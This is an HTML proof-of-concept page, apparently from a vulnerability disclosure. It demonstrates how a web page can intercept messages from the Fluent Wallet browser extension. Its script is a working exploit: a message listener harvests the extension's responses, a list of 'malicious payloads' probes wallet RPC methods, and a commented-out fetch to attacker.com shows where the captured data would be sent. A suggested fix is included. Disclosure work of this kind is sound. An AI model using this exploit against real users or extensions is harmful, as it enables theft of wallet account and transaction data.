
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>üö® CONFIRMED: Fluent Wallet Data Exfiltration</title>
    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
        }
        
        body {
            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
            background: linear-gradient(135deg, #ff0844 0%, #ffb199 100%);
            min-height: 100vh;
            padding: 20px;
        }
        
        .container {
            max-width: 1000px;
            margin: 0 auto;
        }
        
        .alert-banner {
            background: #ff0844;
            color: white;
            padding: 20px;
            border-radius: 12px;
            margin-bottom: 20px;
            text-align: center;
            font-size: 24px;
            font-weight: bold;
            box-shadow: 0 8px 16px rgba(0,0,0,0.3);
            animation: pulse 2s infinite;
        }
        
        @keyframes pulse {
            0%, 100% { transform: scale(1); }
            50% { transform: scale(1.02); }
        }
        
        .card {
            background: white;
            border-radius: 12px;
            padding: 25px;
            margin-bottom: 20px;
            box-shadow: 0 8px 16px rgba(0,0,0,0.2);
        }
        
        h1 {
            color: #ff0844;
            margin-bottom: 15px;
        }
        
        h2 {
            color: #ff0844;
            margin-bottom: 15px;
            padding-bottom: 10px;
            border-bottom: 2px solid #ff0844;
        }
        
        .vulnerability-info {
            background: #fff3cd;
            border-left: 4px solid #ffc107;
            padding: 15px;
            margin: 15px 0;
            border-radius: 4px;
        }
        
        .code-block {
            background: #1e1e1e;
            color: #d4d4d4;
            padding: 15px;
            border-radius: 8px;
            overflow-x: auto;
            font-family: 'Courier New', monospace;
            font-size: 13px;
            margin: 10px 0;
        }
        
        .exfiltrated-data {
            background: #ffebee;
            border: 2px solid #f44336;
            padding: 15px;
            border-radius: 8px;
            margin: 15px 0;
            max-height: 400px;
            overflow-y: auto;
        }
        
        .data-entry {
            padding: 10px;
            margin: 8px 0;
            background: white;
            border-left: 4px solid #f44336;
            border-radius: 4px;
        }
        
        .timestamp {
            color: #666;
            font-size: 12px;
        }
        
        button {
            background: #ff0844;
            color: white;
            border: none;
            padding: 12px 24px;
            border-radius: 6px;
            font-weight: bold;
            cursor: pointer;
            margin: 5px;
            transition: all 0.3s;
        }
        
        button:hover {
            background: #d00737;
            transform: translateY(-2px);
            box-shadow: 0 4px 12px rgba(255, 8, 68, 0.4);
        }
        
        .stats {
            display: grid;
            grid-template-columns: repeat(auto-fit, minmax(150px, 1fr));
            gap: 15px;
            margin: 20px 0;
        }
        
        .stat-box {
            background: linear-gradient(135deg, #ff0844 0%, #ffb199 100%);
            color: white;
            padding: 20px;
            border-radius: 8px;
            text-align: center;
        }
        
        .stat-number {
            font-size: 36px;
            font-weight: bold;
        }
        
        .stat-label {
            font-size: 14px;
            opacity: 0.9;
        }
        
        .success {
            color: #4caf50;
            font-weight: bold;
        }
        
        .warning {
            color: #ff9800;
            font-weight: bold;
        }
        
        .critical {
            color: #f44336;
            font-weight: bold;
        }
    </style>
</head>
<body>
    <div class="container">
        <div class="alert-banner">
            üö® CRITICAL VULNERABILITY CONFIRMED üö®
        </div>
        
        <div class="card">
            <h1>Fluent Wallet - Bidirectional Communication Vulnerability</h1>
            <div class="vulnerability-info">
                <strong>CVE Status:</strong> Pending<br>
                <strong>Severity:</strong> HIGH/CRITICAL<br>
                <strong>Extension ID:</strong> eokbbaidfgdndnljmffldfgjklpjkdoi<br>
                <strong>Vulnerable Pattern:</strong> <code>__fromFluentContentScript: true</code>
            </div>
            
            <h2>Vulnerability Details</h2>
            <p>The Fluent Wallet extension's content script establishes an unrestricted bidirectional message channel between the untrusted web page context and the extension. This allows malicious JavaScript on any webpage to intercept ALL communication from the extension.</p>
            
            <div class="code-block">// Vulnerable code in content-script.js:
r.onMessage.addListener(s => {
  window.postMessage({ 
    msg: s, 
    __fromFluentContentScript: true 
  }, location.origin)
})</div>
            
            <h2>Real-Time Data Exfiltration Demonstration</h2>
            <p>Click the button below to trigger a legitimate Fluent Wallet request and watch how malicious code can intercept the response:</p>
            
            <button onclick="triggerLegitimateRequest()">üéØ Trigger Account Request (Will Show Fluent Popup)</button>
            <button onclick="sendMaliciousPayload()">üíÄ Send Malicious Payload</button>
            <button onclick="clearExfiltratedData()">üóëÔ∏è Clear Data</button>
            
            <div class="stats">
                <div class="stat-box">
                    <div class="stat-number" id="messageCount">0</div>
                    <div class="stat-label">Messages Intercepted</div>
                </div>
                <div class="stat-box">
                    <div class="stat-number" id="vulnerableCount">0</div>
                    <div class="stat-label">Vulnerable Messages</div>
                </div>
                <div class="stat-box">
                    <div class="stat-number" id="dataLeaked">0</div>
                    <div class="stat-label">KB Data Leaked</div>
                </div>
            </div>
        </div>
        
        <div class="card">
            <h2>üìã Exfiltrated Data (Real-Time)</h2>
            <div id="exfiltratedData" class="exfiltrated-data">
                <p style="color: #666; text-align: center; padding: 20px;">
                    Waiting for Fluent Wallet messages to intercept...<br>
                    <small>Any data sent by the extension will appear here</small>
                </p>
            </div>
        </div>
        
        <div class="card">
            <h2>Impact Analysis</h2>
            <ul style="line-height: 2;">
                <li><span class="critical">‚úó</span> Malicious websites can intercept ALL extension responses</li>
                <li><span class="critical">‚úó</span> Account addresses can be leaked without user consent</li>
                <li><span class="critical">‚úó</span> Transaction details visible to malicious scripts</li>
                <li><span class="critical">‚úó</span> Error messages expose internal RPC call stacks</li>
                <li><span class="critical">‚úó</span> No origin validation or message filtering</li>
                <li><span class="critical">‚úó</span> Affects ALL users on ANY website running malicious JavaScript</li>
            </ul>
        </div>
        
        <div class="card">
            <h2>Recommended Fix</h2>
            <div class="code-block">// Secure implementation:
r.onMessage.addListener(s => {
  // 1. Validate message origin
  if (!s.trusted || s.origin !== 'chrome-extension://[extension-id]') {
    return;
  }
  
  // 2. Use namespace isolation
  if (s.safe && s.type === 'FLUENT_RESPONSE') {
    window.postMessage({ 
      __fluentResponse: true,
      data: sanitize(s.data),
      nonce: s.nonce // Validate against pending requests
    }, location.origin);
  }
  
  // 3. Or better: Don't use window.postMessage for sensitive data
  // Use chrome.runtime.sendMessage for internal communication only
});</div>
        </div>
    </div>

    <script>
        let totalMessages = 0;
        let vulnerableMessages = 0;
        let totalDataSize = 0;
        let exfiltratedData = [];
        
        // Malicious code that intercepts Fluent Wallet messages
        window.addEventListener('message', (event) => {
            // Only process messages from the same origin (legitimate-looking)
            if (event.origin !== window.location.origin) return;
            
            totalMessages++;
            updateStats();
            
            // Check for the vulnerable pattern
            if (event.data && event.data.__fromFluentContentScript) {
                vulnerableMessages++;
                
                // Calculate data size
                const dataSize = new Blob([JSON.stringify(event.data)]).size;
                totalDataSize += dataSize;
                
                // Store exfiltrated data
                const entry = {
                    timestamp: new Date().toISOString(),
                    origin: event.origin,
                    data: event.data,
                    size: dataSize
                };
                
                exfiltratedData.push(entry);
                displayExfiltratedData(entry);
                updateStats();
                
                // In a real attack, this data would be sent to attacker's server
                console.log('üö® DATA EXFILTRATED:', entry);
                
                // Simulate sending to attacker server (commented out for demo)
                // fetch('https://attacker.com/collect', {
                //     method: 'POST',
                //     body: JSON.stringify(entry)
                // });
            }
        });
        
        function updateStats() {
            document.getElementById('messageCount').textContent = totalMessages;
            document.getElementById('vulnerableCount').textContent = vulnerableMessages;
            document.getElementById('dataLeaked').textContent = (totalDataSize / 1024).toFixed(2);
        }
        
        function displayExfiltratedData(entry) {
            const container = document.getElementById('exfiltratedData');
            
            // Clear initial message
            if (container.children.length === 1 && container.children[0].tagName === 'P') {
                container.innerHTML = '';
            }
            
            const div = document.createElement('div');
            div.className = 'data-entry';
            div.innerHTML = `
                <div class="timestamp">${entry.timestamp}</div>
                <div style="margin: 8px 0;">
                    <span class="critical">üö® INTERCEPTED MESSAGE FROM EXTENSION</span>
                </div>
                <pre style="font-size: 12px; overflow-x: auto; margin: 8px 0;">${JSON.stringify(entry.data, null, 2)}</pre>
                <div style="font-size: 12px; color: #666;">
                    Size: ${entry.size} bytes | Origin: ${entry.origin}
                </div>
            `;
            
            container.insertBefore(div, container.firstChild);
            
            // Keep only last 10 entries visible
            while (container.children.length > 10) {
                container.removeChild(container.lastChild);
            }
        }
        
        async function triggerLegitimateRequest() {
            console.log('üéØ Triggering legitimate Fluent Wallet request...');
            
            if (!window.conflux && !window.fluent) {
                alert('Fluent Wallet not detected! Please install the extension.');
                return;
            }
            
            const provider = window.conflux || window.fluent;
            
            try {
                // This will trigger a legitimate popup
                const accounts = await provider.request({ 
                    method: 'cfx_requestAccounts' 
                });
                
                console.log('‚úÖ Accounts received:', accounts);
                alert('Success! Check the "Exfiltrated Data" section - the response was intercepted!');
            } catch (error) {
                console.log('‚ùå Request rejected or error:', error);
                alert('Request was rejected, but the error response was still intercepted! Check the "Exfiltrated Data" section.');
            }
        }
        
        function sendMaliciousPayload() {
            console.log('üíÄ Sending malicious payloads...');
            
            // These payloads attempt to trigger responses from the extension
            const maliciousPayloads = [
                { method: 'cfx_accounts', params: [] },
                { method: 'wallet_getPermissions', params: [] },
                { method: 'cfx_gasPrice', params: [] },
                { method: 'cfx_getBalance', params: ['cfx:type.user:aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa6f0vrcsw'] },
                { action: 'getState' },
                { type: 'FLUENT_REQUEST', data: { method: 'cfx_chainId' } }
            ];
            
            maliciousPayloads.forEach((payload, i) => {
                setTimeout(() => {
                    window.postMessage(payload, location.origin);
                    console.log(`Sent malicious payload ${i + 1}:`, payload);
                }, i * 200);
            });
            
            alert('Malicious payloads sent! Watch the "Exfiltrated Data" section for any responses.');
        }
        
        function clearExfiltratedData() {
            exfiltratedData = [];
            totalMessages = 0;
            vulnerableMessages = 0;
            totalDataSize = 0;
            
            document.getElementById('exfiltratedData').innerHTML = `
                <p style="color: #666; text-align: center; padding: 20px;">
                    Data cleared. Waiting for new messages...<br>
                    <small>Any data sent by the extension will appear here</small>
                </p>
            `;
            
            updateStats();
        }
        
        // Log when script loads
        console.log('üö® MALICIOUS SCRIPT LOADED - Listening for Fluent Wallet messages...');
        console.log('All messages with __fromFluentContentScript will be intercepted and exfiltrated.');
    </script>
</body>
</html>
